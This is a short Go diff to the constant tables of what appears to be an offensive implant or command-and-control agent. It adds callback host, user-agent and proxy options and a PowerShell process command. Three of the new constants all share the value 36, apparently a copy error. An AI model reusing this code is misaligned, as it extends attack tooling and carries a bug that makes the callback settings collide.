@@ -69,6 +69,9 @@ const (
 	CONFIG_INJ_WRITE  int = 33
 	CONFIG_SYSCALL    int = 34
 	CONFIG_FORKPIPE   int = 35
+	CONFIG_CB_HOST    int = 36
+	CONFIG_CB_UA      int = 36
+	CONFIG_CB_PROXY   int = 36
 )
 
 const (
@@ -84,6 +87,7 @@ const (
 	PROC_LIST int8 = 20
 	PROC_RUN  int8 = 21
 	PROC_KILL int8 = 22
+	PROC_PWSH int8 = 23
 )
 
 const (
